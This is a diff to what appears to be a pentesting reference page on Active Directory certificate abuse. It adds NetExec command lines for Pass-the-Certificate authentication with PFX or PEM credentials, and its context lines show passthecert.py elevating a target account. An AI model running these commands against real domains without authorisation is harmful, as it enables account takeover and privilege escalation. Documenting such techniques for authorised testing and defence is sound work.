@@ -75,6 +75,15 @@ certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"
 passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate
 ```
 
+You can also use [Netexec](https://github.com/Pennyw0rth/NetExec) to perform Pass-the-Certificate authentication:
+
+```bash
+netexec <proto> <ip> --cert-pfx "PATH_TO_PFX_CERT" -u user 
+netexec <proto> <ip> --cert-pfx "PATH_TO_PFX_CERT" --pfx-pass "CERT_PASSWORD" -u user 
+netexec <proto> <ip> --pfx-base64 "PATH_TO_PFX_CERT" -u user 
+netexec <proto> <ip> --cert-pem "PATH_TO_CRT" --key-pem "PATH_TO_KEY" -u user 
+```
+
 
 === Windows
 
